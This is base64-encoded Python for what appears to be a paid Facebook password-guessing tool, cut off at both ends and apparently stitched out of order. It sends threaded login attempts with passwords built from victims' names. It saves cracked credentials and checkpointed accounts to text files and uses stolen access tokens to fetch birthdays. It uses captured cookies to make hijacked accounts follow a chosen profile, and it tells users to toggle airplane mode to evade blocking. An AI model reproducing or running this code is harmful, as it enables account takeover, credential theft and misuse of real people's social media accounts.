lvbi5jb29raWVzLmdldF9kaWN0KCk6CiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICB0b2tlbnogPSBvcGVuKCcudG9rZW4udHh0JykucmVhZCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGNwX3R0bCA9IHNlc3Npb24uZ2V0KGYnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20ve3VzZXJ9P2ZpZWxkcz1iaXJ0aGRheSZhY2Nlc3NfdG9rZW49e3Rva2Vuen0nKS5qc29uKClbJ2JpcnRoZGF5J10KICAgICAgICAgICAgICAgICAgICAgICAgbW9udGgsIGRheSwgeWVhciA9IGNwX3R0bC5zcGxpdCgnLycpCiAgICAgICAgICAgICAgICAgICAgICAgIG1vbnRoID0gYnVsYW5fdHRsW21vbnRoXQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgnXHIlc1tTb3VtaWstQ1BdICVzIHwgJXMgJyAlIChNLCB1c2VyLCBwdykpCiAgICAgICAgICAgICAgICAgICAgICAgIHdydCA9ICclc3wlcycgJSAodXNlcixwdykKICAgICAgICAgICAgICAgICAgICAgICAgY3AuYXBwZW5kKHdydCkKICAgICAgICAgICAgICAgICAgICAgICAgb3BlbignU291bWlrX0NQLnR4dCcgLCAnYScpLndyaXRlKCclc1xuJyAlIHdydCkKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICBleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToKICAgICAgICAgICAgICAgICAgICAgICAgbW9udGggPSAnJwogICAgICAgICAgICAgICAgICAgICAgICBkYXkgICA9ICcnCiAgICAgICAgICAgICAgICAgICAgICAgIHllYXIgID0gJycKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICBwcmludCgnXHIlc1tTb3VtaWstQ1BdICVzIHwgJXMgJyAlIChNLCB1c2VyLCBwdykpCiAgICAgICAgICAgICAgICAgICAgd3J0ID0gJyVzfCVzJyAlICh1c2VyLHB3KQogICAgICAgICAgICAgICAgICAgIGNwLmFwcGVuZCh3cnQpCiAgICAgICAgICAgICAgICAgICAgb3BlbignU291bWlrX0NQLnR4dCcgLCAnYScpLndyaXRlKCclc1xuJyAlIHdydCkKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBsb29wKz0xCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBzZWxmLl9fbWV0b2RlX18odXNlciwgcHcsIGNlYm9rKQoKICAgIGRlZiBmb2xsb3coc2VsZiwgc2Vzc2lvbiwgY29raSk6CiAgICAgICAgciA9IEJlYXV0aWZ1bFNvdXAoc2Vzc2lvbi5nZXQoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9wcm9maWxlLnBocD9pZD0xMDAwMDc2MDcwNTQ4NDUnLCBjb29raWVzPXsnY29va2llJzogY29raX0pLnRleHQsICdodG1sLnBhcnNlcicpCiAgICAgICAgZ2V0ID0gci5maW5kKCdhJywgc3RyaW5nPSdJa3V0aScpLmdldCgnaHJlZicpCiAgICAgICAgc2Vzc2lvbi5nZXQoKCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20nICsgc3RyKGdldCkpLCBjb29raWVzPXsnY29va2llJzogY29raX0pLnRleHQKCiAgICBkZWYgX19wbGVyX18oc2VsZik6CiAgICAgICAgcHJpbnQoJ1sxXSBDUkFDSyBXSVRIIEFVVE8gUEFTUyAnKQogICAgICAgIHByaW50KCdbMl0gQ1JBQ0sgV0lUSCBOQU1FIERJR0lUIFBBU1MnKQogICAgICAgIGNoaSA9IGlucHV0KCdcbls/XSBDSE9PU0UgOiAnKQogICAgICAgIGlmIGNoaSA9PSAnJzoKICAgICAgICAgICAgcHJpbnQoJ1xuU0VMRUNUIENPUlJFQ1QgT05FJykKICAgICAgICAgICAgc2VsZi5fX3BsZXJfXygpCiAgICAgICAgZWxpZiBjaGkgaW4gKCcxJywgJzAxJyk6CiAgICAgICAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQogICAgICAgICAgICBwcmludChsb2dvKQogICAgICAgICAgICBwcmludCgiXDAzM1sxOzkxbVxyVVNFIEZMSUdIVCAoYWlycGxhbmUpIE1PREUgT05cMDMzWzE7OTZtIikKICAgICAgICAgICAgcHJpbnQoNTAqIi0iKQogICAgICAgICAgICBwcmludCgnXDAzM1sxOzM2bVRPVEFMIElEUyA6ICVzICcgJSBsZW4oc2VsZi5pZCkpCiAgICAgICAgICAgIHByaW50KCdcMDMzWzE7MzZtQ1JBQ0tJTkcgU1RBUlRFRC4uLi4uJykKICAgICAgICAgICAgcHJpbnQoNTAqIi0iKQogICAgICAgICAgICB3aXRoIHNhcmZyYXpzc2IobWF4X3dvcmtlcnM9MzApIGFzIHNzYndvcmxkOgogICAgICAgICAgICAgICAgZm9yIHpzYiBpbiBzZWxmLmlkOiAjIEJBTkxBREVTSEkgQlJBTkQgQlJPCiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICB1aWQsIG5hbWUgPSB6c2Iuc3BsaXQoJ3wnKQogICAgICAgICAgICAgICAgICAgICAgICB4eiA9IG5hbWUuc3BsaXQoJyAnKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4oeHopID09IDMgb3IgbGVuKHh6KSA9PSA0IG9yIGxlbih4eikgPT0gNSBvciBsZW4oeHopID09IDY6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbbmFtZSwgeHpbMF0rIjEyMyIsIHh6WzBdK3h6WzFdLCB4elswXSsiMTIzNDUiXQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHd4ID0gW25hbWUsIHh6WzBdKyIxMjMiLCB4elswXSt4elsxXSwgeHpbMF0rIjEyMzQ1Il0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFsiNzg2MTEwIl0KICAgICAgICAgICAgICAgICAgICAgICAgc3Nid29ybGQuc3VibWl0KHNlbGYuX19tZXRvZGVfXywgdWlkLCBwd3gsICJtYmFzaWMuZmFjZWJvb2suY29tIikKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgaGFzaWwob2ssY3ApCiAgICAgICAgZWxpZiBjaGkgaW4gKCcyJywgJzAyJyk6CiAgICAgICAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQogICAgICAgICAgICBwcmludChsb2dvKQogICAgICAgICAgICBwcmludCgiXDAzM1sxOzMybVxyRU5URVIgTEFTVCBOQU1FIERJR0lUc1wwMzNbMTszMm1cbiIpCiAgICAgICAgICAgIHAxID0gaW5wdXQoJyAgTmFtZSArIDEgOiAnKQogICAgICAgICAgICBwMiA9IGlucHV0KCcgIE5hbWUgKyAyIDogJykKICAgICAgICAgICAgcDMgPSBpbnB1dCgnICBOYW1lICsgMyA6ICcpCiAgICAgICAgICAgIHA0ID0gaW5wdXQoJyAgTmFtZSArIDQgOiAnKQogICAgICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgICAgICAgICAgcHJpbnQobG9nbykKICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszMW1cclVTRSBGTElHSFQgKGFpcnBsYW5lKSBNT0RFIEJFRk9SRSBVU0VcMDMzWzE7MzJtIikKICAgICAgICAgICAgcHJpbnQoNTAqIi0iKQogICAgICAgICAgICBwcmludCgnXDAzM1sxOzMybVRPVEFMIElEUyA6ICVzICcgJSBsZW4oc2VsZi5pZCkpCiAgICAgICAgICAgIHByaW50KCdcMDMzWzE7MzJtQ1JBQ0tJTkcgU1RBUlRFRC4uLi4uJykKICAgICAgICAgICAgcHJpbnQoNTAqIi0iKQogICAgICAgICAgICB3aXRoIHNhcmZyYXpzc2IobWF4X3dvcmtlcnM9MzApIGFzIHNzYndvcmxkOgogICAgICAgICAgICAgICAgZm9yIHpzYiBpbiBzZWxmLmlkOiAjIEl0J3MgQmFubGFkZXNoaSBicmFuZCBicm8uCiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICB1aWQsIG5hbWUgPSB6c2Iuc3BsaXQoJ3wnKQogICAgICAgICAgICAgICAgICAgICAgICB4eiA9IG5hbWUuc3BsaXQoJyAnKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4oeHopID09IDMgb3IgbGVuKHh6KSA9PSA0IG9yIGxlbih4eikgPT0gNSBvciBsZW4oeHopID09IDY6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbbmFtZSwgeHpbMF0rIjEyMyIsIHh6WzBdK3h6WzFdLCB4elswXSsiMTIzNDUiXQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHd4ID0gW25hbWUsIHh6WzBdKyIxMjMiLCB4elswXSt4elsxXSwgeHpbMF0rIjEyMzQ1Il0KICAgICAgICAgICAgICAgICAgICAgICAgc3Nid29ybGQuc3VibWl0KHNlbGYuX19tZXRvZGVfXywgdWlkLCBwd3gsICJtYmFzaWMuZmFjZWJvb2suY29tIikKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgaGFzaWwob2ssY3ApCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoJ1xuIFNlbGVjdCBWYWxpZCBPbmUnKQogICAgICAgICAgICBzZWxmLl9fcGxlcl9fKCkKZGVmIGJuc2J1eSgpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCAobG9nbykKICAgIGZyb20gdXJsbGliLnBhcnNlIGltcG9ydCBxdW90ZQogICAgcHJpbnQoJ1x0Q2hlY2tpbmcgRm9yIFN1YnNjcmlwdGlvbi4uLlxuJykKICAgIHRyeToKICAgICAgICBmID0gKGIneFx4OWNceGQzT0ksSVx4ZDRceDA3XHgxM1x4YzlceGY5XHhiOXolXHhhOUVceGI5XHhhNVx4MTVceGZhaVx4OTk5XHhhOVx4YzVceGZhXHhhNVx4YzVFXHhmYVx4YTklXHhjOVx4ZmFceDEwXHhjMVx4YTRceGNjPFx4MDB9XHgxZVx4MTFceDE3JykKICAgICAgICBiZCA9ICh6bGliLmRlY29tcHJlc3MoZikpCiAgICAgICAgdG8gPSAob3BlbihiZCwgJ3InKS5yZWFkKCkpCiAgICBleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToKICAgICAgICBibnNyZWcoKQogICAgdHJ5OgogICAgICAgIGJ0ID0gKGIneFx4OWNceGNiKCkpKFx4YjZceGQyXHhkNy9KLFx4ZDdLXHhjZixceGM5KE0qLU4tSlx4Y2VceGNmK0lceGNkK1x4ZDFLXHhjZVx4Y2ZceGQ1NzEwXHhkMVx4ZjVceGNiL1x4ZDF1d1xyXHhkMS9ceGQ2XHhjZk1ceGNjXHhjY1x4ZDNPXHgwNFx4MDAmIVx4MTMmJykKICAgICAgICBidyA9ICh6bGliLmRlY29tcHJlc3MoYnQpKQogICAgICAgIHIgPSAocmVxdWVzdHMuZ2V0KGJ3KS50ZXh0KQogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgogICAgICAgIHByaW50ICgiXHgxYlswOzM3bU5vIEludGVybmV0IENvbm5lY3Rpb24iKQogICAgICAgIGV4aXQoKQoKICAgIGlmIHRvIGluIHI6CiAgICAgICAgZnVjay5hcHBlbmQoMSkKICAgICAgICBzYXJmcmF6KCkKICAgIGVsc2U6CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgcHJpbnQgKGxvZ28pCiAgICAgICAgcHJpbnQgKCdceDFiWzE7OTdtXHJZb3VyIFRva2VuIElzIE5vdCBTdWJzY3JpYmVkXG4nKQogICAgICAgIHByaW50CiAgICAgICAgcHJpbnQKICAgICAgICBwcmludCAoJ1xyXHgxYlsxOzk3bSBZb3VyIFRva2VuIDogJyArIHRvICsgJ1xuJykKICAgICAgICBwcmludAogICAgICAgIHByaW50KCdcclRvb2wgUHJpY2UgMjAwVGtcbicpCiAgICAgICAgcHJpbnQKICAgICAgICBwcmludCgnXFdoYXRzYXBwIEFjY291bnQgTnVtYmVyIDAxNzczMTQ3NzE0XG4nKQogICAgICAgIHByaW50KCdcckFjY291bnQgTmFtZSBTb3VtaWsgQWhtZWRcbicpCiAgICAgICAgcHJpbnQKICAgICAgICBwcmludAogICAgICAgIHByaW50KCdcclBheW1lbnQgU3VjY2Vzc2Z1bGx5IE1zZyBPciBUb2tlbiBTZW5kXG4nKQogICAgICAgIHByaW50CiAgICAgICAgcHJpbnQKICAgICAgICBzYiA9IGlucHV0KCdcclBhc3RlIEhlcmUgUGF5bWVudCBTdWNjZXNzZnVsbHkgTXNnOicpCiAgICAgICAgcHJpbnQgKCdcbicpCiAgICAgICAgc3MgPSBpbnB1dCgnXHJQYXN0ZSBIZXJlIHlvdXIgVG9rZW46JykKICAgICAgICBwcmludCgnXG4nKQogICAgICAgIHByaW50KCdccllvdXIgUmVxdWVzdCBTdWJtaXR0ZWQgUGxlYXNlIHdhaXQgICcpCiAgICAgICAgdGtzID0gJ0hlbGxvJTIwQWRtaW4lMjBBcHByb3ZhbCUyMG15JTIwa2V5LiUyMHBheW1lbnQlMjBEb25lLCUyMCUyMEluZm9ybWF0aW9uJTIwOi0lMjAlMjAlMjBUcmFjayUyME1zZyUyMDolMjAlMjAnK3NiKyclMjBUb2tlbiUyMDolMjAnK3NzCiAgICAgICAgb3Muc3lzdGVtKCdhbSBzdGFydCBodHRwczovL3dhLm1lLys5MjMyMDY2MjAyNjk/dGV4dD0nICsgdGtzKQoKZGVmIGJuc3JlZygpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCAobG9nbykKICAgIHByaW50ICgnXHgxYlsxOzk3bVx0WW91ciBUb2tlbiBJcyBOb3QgU3Vic2NyaWJlZFxuJykKICAgIHByaW50CiAgICBpZCA9IHN0cih1dWlkLnV1aWQxKHV1aWQuZ2V0bm9kZSgpLDApKVsyNDpdLnVwcGVyKCkgKyAiflNBUz09IgogICAgcHJpbnQKICAgIHByaW50ICgnXG5ceDFiWzE7OTdtIFlvdXIgVG9rZW46IFx4MWJbOTdtJyArIGlkICsgJ1xuJykKICAgIHByaW50CiAgICBwcmludCgnXHJUb29sIFByaWNlIDIwMFRLXG4nKQogICAgcHJpbnQKICAgIHByaW50KCdcV2hhdHNhcHAgQWNjb3VudCBOdW1iZXIgMDE3NzMxNDc3MTRcbicpCiAgICBwcmludCgnXHJBY2NvdW50IE5hbWUgU09VTUlLIEFITUVEXG4nKQogICAgcHJpbnQKICAgIHByaW50KCdcclBheW1lbnQgU3VjY2Vzc2Z1bGx5IE1zZyBPciBUb2tlbiBTZW5kXG4nKQogICAgcHJpbnQKICAgIHNiID0gaW5wdXQoJ1xyUGFzdGUgSGVyZSBQYXltZW50IFN1Y2Nlc3NmdWxseSBNc2c6JykKICAgIHByaW50ICgnXG4nKQogICAgc3MgPSBpbnB1dCgnXHJQYXN0ZSBIZXJlIHlvdXIgVG9rZW46JykKICAgIHByaW50ICgnXG4nKQogICAgcHJpbnQoJ1lvdXIgUmVxdWVzdCBTdWJtaXR0ZWQgUGxlYXNlIHdhaXQgICcpCiAgICB0a3MgPSAnSGVsbG8lMjBBZG1pbiUyMEFwcHJvdmFsJTIwbXklMjBrZXkuJTIwcGF5bWVudCUyMERvbmUsJTIwJTIwSW5mb3JtYXRpb24lMjA6LSUyMCUyMCUyMFRyYWNrJTIwTXNnJTIwOiUyMCUyMCcrc2IrJyUyMFRva2VuJTIwOiUyMCcrc3MKICAgIG9zLnN5c3RlbSgnYW0gc3RhcnQgaHR0cHM6Ly93YS5tZS8rOTIzMjA2NjIwMjY5P3RleHQ9JyArIHRrcykKICAgIGYgPSAoYid4XHg5Y1x4ZDNPSSxJXHhkNFx4MDdceDEzXHhjOVx4ZjlceGI5eiVceGE5RVx4YjlceGE1XHgxNVx4ZmFpXHg5OTlceGE5XHhjNVx4ZmFceGE1XHhjNUVceGZhXHhhOSVceGM5XHhmYVx4MTBceGMxXHhhNFx4Y2M8XHgwMH1ceDFlXHgxMVx4MTcnKQogICAgYmQgPSAoemxpYi5kZWNvbXByZXNzKGYpKQogICAgc2F2ID0gb3BlbihiZCwgJ3cnKSAKICAgIHNhdi53cml0ZShpZCkKICAgIHNhdi5jbG9zZSgpCiAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgIHRpbWUuc2xlZXAoMykKICAgIGV4aXQoKQpjbGFzcyBsb2FkOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIF8gPSAnJwogICAgICAgIF9fID0gaW50KCczMCcpCiAgICAgICAgX19fID0gaW50KCcwJykKICAgICAgICBfXyAtPSAxCiAgICAgICAgX19fICs9IDEKICAgICAgICBmb3IgdCBpbiByYW5nZShpbnQoIjEiKSk6CiAgICAgICAgICAgIHByaW50KCdcciBQbGVhc2UgV2FpdCAuLi4uJykKICAgICAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4xKQogICAgICAgIHByaW50KCdcbicpCgpzYXJmcmF6KCkKKck10gaW5zdGFsbGluZyByZXF1ZXN0cyAhLi4uXG4nKQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCByZXF1ZXN0cycpCgp0cnk6CiAgICBpbXBvcnQgY29uY3VycmVudC5mdXR1cmVzCmV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgIHByaW50KCdcbiBb4pyTXSBpbnN0YWxsaW5nIGZ1dHVyZXMgIS4uLlxuJykKICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgZnV0dXJlcycpCgp0cnk6CiAgICBpbXBvcnQgYnM0CmV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgIHByaW50KCdcbiBb4pyTXSBpbnN0YWxsaW5nIGJzNCAhLi4uXG4nKQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBiczQnKQoKaW1wb3J0IHJlcXVlc3RzLCBvcywgcmUsIGJzNCxwbGF0Zm9ybSwgc3lzLCBqc29uLCB0aW1lLCByYW5kb20sIGRhdGV0aW1lLCBzdWJwcm9jZXNzLCB0aHJlYWRpbmcsIGl0ZXJ0b29scyxiYXNlNjQsdXVpZCx6bGliCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgc2FyZnJhenNzYgpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cAoKCmN0ID0gZGF0ZXRpbWUubm93KCkKbiA9IGN0Lm1vbnRoCmJ1bGFuID0gWydKYW51YXJ5JywgJ0ZlYnJ1YXJ5JywgJ01hcmNoJywgJ0FwcmlsJywgJ01heScsICdKdW5lJywgJ0p1bHknLCAnQWd1c3R1cycsICdTZXB0ZW1iZXInLCAnT2N0b2JlcicsICdOb3ZlbWJlcicsICdEZWNlbWJlciddCnRyeToKICAgIGlmIG4gPCAwIG9yIG4gPiAxMjoKICAgICAgICBleGl0KCkKICAgIG5UZW1wID0gbiAtIDEKZXhjZXB0IFZhbHVlRXJyb3I6CiAgICBleGl0KCkKCmN1cnJlbnQgPSBkYXRldGltZS5ub3coKQp0YSA9IGN1cnJlbnQueWVhcgpidSA9IGN1cnJlbnQubW9udGgKaGEgPSBjdXJyZW50LmRheQpvcCA9IGJ1bGFuW25UZW1wXQpQID0gJ1x4MWJbMTs5N20nICMgCk0gPSAnXDAzM1sxOzMxbScgIyAKSCA9ICdcMDMzWzE7MzJtJyAjIApLID0gJ1x4MWJbMTs5N20nICMgCkIgPSAnXHgxYlsxOzk3bScgIyAKVSA9ICdceDFiWzE7OTdtJyAjIApPID0gJ1x4MWJbMTs5N20nICMgCk4gPSAnXHgxYlswbScgICAgIyAKbXlfY29sb3IgPSBbCiBQLCBNLCBILCBLLCBCLCBVLCBPLCBOXQp3YXJuYSA9IHJhbmRvbS5jaG9pY2UobXlfY29sb3IpCmRhdGEsZGF0YTI9e30se30KYW1hbixjcCxzYWxhaD0wLDAsMAp1YmFoUCxmdWNrLHB3QmFydT1bXSxbXSxbXQpvayA9IFtdCmNwID0gW10KaWQgPSBbXQp1c2VyID0gW10KbG9vcCA9IDAKdXJsX2xvb2t1cCA9ICJodHRwczovL2xvb2t1cC1pZC5jb20vIgp1cmxfbWIgPSAiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbSIKdXJsX2lwID0gImh0dHBzOi8vd3d3Lmh0dHBiaW4ub3JnL2lwIgpoZWFkZXJfZ3J1cCA9IHsidXNlci1hZ2VudCI6ICJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IE1pIDlUIFBybyBCdWlsZC9RS1ExLjE5MDgyNS4wMDI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODguMC40MzI0LjE4MSBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJBTi9FTUE7RkJMQy9pdF9JVDtGQkFWLzIzOS4wLjAuMTAuMTA5O10ifQpidWxhbl90dGwgPSB7IjAxIjogIkphbnVhcnkiLCAiMDIiOiAiRmVicnVhcnkiLCAiMDMiOiAiTWFyY2giLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWF5IiwgIjA2IjogIkp1bmUiLCAiMDciOiAiSnVseSIsICIwOCI6ICJBdWd1c3R1cyIsICIwOSI6ICJTZXB0ZW1iZXIiLCAiMTAiOiAiT2N0b2JlciIsICIxMSI6ICJOb3ZlbWJlciIsICIxMiI6ICJEZWNlbWJlciJ9CmRvbmUgPSBGYWxzZQoKZGVmIGphbGFuKHopOgogICAgZm9yIGUgaW4geiArICdcbic6CiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShlKQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIHRpbWUuc2xlZXAoMC4wMSkKCmxvZ28gPSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiIiIgICAKCgrigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTimIXimIXimIXigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTimIXigJQK4piFCuKYheKWkeKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWkeKWiOKWiOKWiOKWiOKWiOKVl+KWkeKWiOKWiOKVl+KWkeKWkeKWkeKWiOKWiOKVl+KYheKWiOKWiOKWiOKVl+KWkeKWkeKWkeKWiOKWiOKWiOKVl+KWiOKWiOKVl+KWiOKWiOKVl+KWkeKWkeKWiOKWiOKVlwrimIXilojilojilZTilZDilZDilZDilZDilZ3ilojilojilZTilZDilZDilojilojilZfilojilojilZHilpHilpHilpHilojilojilZHimIXilojilojilojilojilZfilpHilojilojilojilojilZHilojilojilZHilojilojilZHilpHilojilojilZTilZ0K4piF4pWa4paI4paI4paI4paI4paI4pWX4paR4paI4paI4pWR4paR4paR4paI4paI4pWR4paI4paI4pWR4paR4paR4paR4paI4paI4pWR4piF4paI4paI4pWU4paI4paI4paI4paI4pWU4paI4paI4pWR4paI4paI4pWR4paI4paI4paI4paI4paI4pWQ4pWd4paRCuKYheKWkeKVmuKVkOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVkeKWkeKWkeKWiOKWiOKVkeKWiOKWiOKVkeKWkeKWkeKWkeKWiOKWiOKVkeKYheKWiOKWiOKVkeKVmuKWiOKWiOKVlOKVneKWiOKWiOKVkeKWiOKWiOKVkeKWiOKWiOKVlOKVkOKWiOKWiOKVl+KWkQrimIXilojilojilojilojilojilojilZTilZ3ilZrilojilojilojilojilojilZTilZ3ilZrilojilojilojilojilojilojilZTilZ3imIXilojilojilZHilpHilZrilZDilZ3ilpHilojilojilZHilojilojilZHilojilojilZHilpHilZrilojilojilZcK4piF4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4paR4paR4pWa4pWQ4pWQ4pWQ4pWQ4pWd4paR4paR4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4paR4piF4pWa4pWQ4pWd4paR4paR4paR4paR4paR4pWa4pWQ4pWd4pWa4pWQ4pWd4pWa4pWQ4pWd4paR4paR4pWa4pWQ4pWdCuKYhQrimIXigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTimIXimIXimIXigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJTigJQKIAogICAKXDAzM1swOzkzbeKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYhSDimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIUKXDAzM1swOzkxbUFVVEhPUiA6IDogU09VTUlLCiAKXDAzM1swOzkzbUZBQ0VCT09LIDogOiBzb3VtaWs5NTYKIApcMDMzWzA7OTZtR0lUSFVCIDogOiBTQVMtMDA3CiAKXDAzM1swOzk1bVRPT0xTICAgOiA6IEZJTEUgQ0xPTklORyAob25seSkKXDAzM1swOzk2beKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYheKYhSDimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIXimIUiIiIgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCgpkZWYgaGFzaWwoT0ssY3ApOgoJaWYgbm90IGxlbihPSykgIT0gMDoKCSAgICBwYXNzCglpZiBsZW4oY3ApICE9IDA6CgkgICAgcHJpbnQoJ1xuXG4gXHgxYlsxOzkybVRPVEFMIE9LIDogXHgxYlsxOzkybSAlcyAgXHgxYlsxOzkybVNPVU1JS19PSy50eHQnICUgKEgsIFAsIHN0cihsZW4ob2spKSkpCgkgICAgcHJpbnQoJyBceDFiWzE7OTFtVE9UQUwgQ1AgOlx4MWJbMTs5MW0gICAlcyBceDFiWzE7OTFtU09VTUlLX0NQLnR4dCcgJSAoSCwgUCwgc3RyKGxlbihjcCkpKSkKCSAgICBpbnB1dCgiXHgxYlsxOzkybVBSRVNTIEVOVEVSIFRPIEJBQ0sgTUVOVSAiKQoJICAgIHNhcmZyYXooKQoKZGVmIHNhcmZyYXooKToKCgoKCiAgICAgICAgCiAgCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHByaW50KGxvZ28pCiAgICBpcG0gPSByZXF1ZXN0cy5nZXQodXJsX2lwKS5qc29uKCkKICAgIHRvZHogPSAnJwogICAgSVAgPSBpcG1bJ29yaWdpbiddCiAgICBwcmludAogICAgcHJpbnQoJyBbMV0gU1RBUlQgRklMRSBDTE9OSU5HJykKICAgIHByaW50KCcgWzNdIEVYSVQgJykKICAgIHByaW50KCcnKQogICAgX3NhcmZyYXpfX18gPSBpbnB1dCgnIFs/XSBDSE9PU0UgT1BUSU9OIDogJykKICAgIGlmIF9zYXJmcmF6X19fIGluICgnMScsICcwMScpOgogICAgICAgIF9feHh4X18oKS5zYXJmcmF6eChpZCkKICAgIGlmIF9zYXJmcmF6X19fIGluICgnMicsICcwMicpOgogICAgICAgIG9zLnN5c3RlbSgncHl0aG9uIGRtLnB5JykKICAgIGlmIF9zYXJmcmF6X19fIGluICgnMycsICcwMycpOgogICAgICAgIHBhc3MKCgpjbGFzcyBfX3h4eF9fOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuaWQgPSBbXQogICAgZGVmIHNhcmZyYXp4KHNlbGYsaWQpOgogIAogICAgICAgCiAgICAgIAogICAgICAgICAKICAgICAgICAgICAgCiAgICAgICAgICAgIAogICAgICAgICAgICAKCiAgICAgICAgb3Muc3lzdGVtKCJjbGVhciIpCiAgICAgICAgcHJpbnQobG9nbykKICAgICAgICBzZWxmLmNudCA9IGlucHV0KCdQVVQgRklMRSBOQU1FIDogJykKICAgICAgICBzZWxmLmlkID0gb3BlbihzZWxmLmNudCkucmVhZCgpLnNwbGl0bGluZXMoKQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIHByaW50KGxvZ28pCiAgICAgICAgcHJpbnQoIiIpCiAgICAgICAgX19fd29ybGR3aWRlX19fID0gKCd5JykKICAgICAgICBpZiBfX193b3JsZHdpZGVfX18gaW4gKCd5ZXMnLCdZZXMnLCdZJywgJ3knKToKICAgICAgICAgICAgc2VsZi5fX3BsZXJfXygpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoJyBbIV0gQ0hPT1NFIENPUlJFQ